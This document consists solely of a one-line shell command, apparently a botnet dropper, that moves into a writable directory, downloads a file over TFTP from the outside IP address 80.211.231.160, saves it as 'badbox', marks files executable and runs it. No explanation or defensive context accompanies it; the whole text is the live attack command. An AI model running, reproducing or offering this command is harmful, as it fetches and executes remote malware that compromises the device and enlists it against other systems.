cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 80.211.231.160;cat ftp >badbox;chmod +x *;./badbox
